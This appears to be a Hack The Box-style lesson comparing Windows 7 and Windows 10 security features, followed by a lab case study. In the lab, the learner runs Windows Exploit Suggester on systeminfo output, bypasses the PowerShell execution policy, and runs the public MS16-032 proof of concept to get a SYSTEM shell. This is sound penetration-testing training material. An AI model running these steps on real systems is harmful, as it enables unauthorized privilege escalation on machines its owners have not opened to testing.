## Windows 7 vs. Newer Versions
|Feature|Windows 7|Windows 10|
|---|---|---|
|[Microsoft Password (MFA)](https://blogs.windows.com/windowsdeveloper/2016/01/26/convenient-two-factor-authentication-with-microsoft-passport-and-windows-hello/)||X|
|[BitLocker](https://docs.microsoft.com/en-us/windows/security/information-protection/bitlocker/bitlocker-overview)|Partial|X|
|[Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard)||X|
|[Remote Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)||X|
|[Device Guard (code integrity)](https://techcommunity.microsoft.com/t5/iis-support-blog/windows-10-device-guard-and-credential-guard-demystified/ba-p/376419)||X|
|[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview)|Partial|X|
|[Windows Defender](https://www.microsoft.com/en-us/windows/comprehensive-security)|Partial|X|
|[Control Flow Guard](https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard)||X|
## Windows 7 Case Study
#### Gathering Systeminfo Command Output

```cmd
C:\htb> systeminfo
```
#### Updating the Local Microsoft Vulnerability Database

```shell
3kjS@htb[/htb]$ sudo python2 windows-exploit-suggester.py --update
```
#### Running Windows Exploit Suggester

```shell
3kjS@htb[/htb]$ python2 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt
```
#### Exploiting MS16-032 with PowerShell PoC

Let's use a [PowerShell PoC](https://www.exploit-db.com/exploits/39719) to attempt to exploit this and elevate our privileges.
```powershell
PS C:\htb> Set-ExecutionPolicy bypass -scope process
PS C:\htb> Import-Module .\Invoke-MS16-032.ps1 
PS C:\htb> Invoke-MS16-032
```
#### Spawning a SYSTEM Console

```cmd
C:\htb> whoami 

nt authority\system
```
